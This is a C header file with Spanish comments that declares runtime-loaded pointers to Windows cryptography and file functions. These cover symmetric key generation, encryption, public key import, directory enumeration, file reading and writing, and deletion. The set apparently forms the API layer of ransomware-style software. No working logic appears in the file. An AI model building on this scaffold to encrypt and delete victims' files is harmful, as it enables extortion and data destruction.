#ifndef API_H
#define API_H

#include <windows.h>
#include <bcrypt.h>
#include <wincrypt.h>

// tipos de las funciones
typedef NTSTATUS (WINAPI *tBCryptOpenAlgorithmProvider)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
typedef NTSTATUS (WINAPI *tBCryptCloseAlgorithmProvider)(BCRYPT_ALG_HANDLE, ULONG);
typedef NTSTATUS (WINAPI *tBCryptGenRandom)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *tBCryptGenerateSymmetricKey)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *tBCryptEncrypt)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS (WINAPI *tBCryptDestroyKey)(BCRYPT_KEY_HANDLE);
typedef NTSTATUS (WINAPI *tBCryptImportKeyPair)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE, LPCWSTR, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, ULONG);
typedef BOOL (WINAPI *tCryptStringToBinaryA)(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);
typedef BOOL (WINAPI *tCryptDecodeObjectEx)(DWORD, LPCSTR, const BYTE*, DWORD, DWORD, PCRYPT_DECODE_PARA, void*, DWORD*);
typedef HANDLE (WINAPI *tFindFirstFileA)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL (WINAPI *tFindNextFileA)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL (WINAPI *tFindClose)(HANDLE);
typedef HANDLE (WINAPI *tCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *tReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *tWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *tCloseHandle)(HANDLE);
typedef BOOL (WINAPI *tDeleteFileA)(LPCSTR);
typedef DWORD (WINAPI *tGetFileSize)(HANDLE, LPDWORD);
typedef HLOCAL (WINAPI *tLocalFree)(HLOCAL);

// punteros globales
extern tBCryptOpenAlgorithmProvider        pBCryptOpenAlgorithmProvider;
extern tBCryptCloseAlgorithmProvider       pBCryptCloseAlgorithmProvider;
extern tBCryptGenRandom                    pBCryptGenRandom;
extern tBCryptGenerateSymmetricKey         pBCryptGenerateSymmetricKey;
extern tBCryptEncrypt                      pBCryptEncrypt;
extern tBCryptDestroyKey                   pBCryptDestroyKey;
extern tBCryptImportKeyPair                pBCryptImportKeyPair;
extern tCryptStringToBinaryA               pCryptStringToBinaryA;
extern tCryptDecodeObjectEx                pCryptDecodeObjectEx;
extern tFindFirstFileA                     pFindFirstFileA;
extern tFindNextFileA                      pFindNextFileA;
extern tFindClose                          pFindClose;
extern tCreateFileA                        pCreateFileA;
extern tReadFile                           pReadFile;
extern tWriteFile                          pWriteFile;
extern tCloseHandle                        pCloseHandle;
extern tDeleteFileA                        pDeleteFileA;
extern tGetFileSize                        pGetFileSize;
extern tLocalFree                          pLocalFree;

// carga y verifica
BOOL load_functions(void);
BOOL check_functions(void);

#endif